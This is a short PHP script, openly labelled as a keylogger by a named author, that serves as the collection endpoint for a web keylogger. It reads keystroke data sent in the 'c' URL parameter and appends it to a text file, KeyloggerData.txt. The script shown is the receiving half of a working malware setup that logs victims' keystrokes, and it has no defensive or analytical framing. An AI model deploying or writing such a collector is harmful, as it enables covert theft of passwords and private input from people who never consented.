<?php
// keylogger.php by ANONUD4Y
 
if(!empty($_GET['c'])) {
    $logfile = fopen('KeyloggerData.txt', 'a+');
    fwrite($logfile, $_GET['c']);
    fclose($logfile);
}
?>
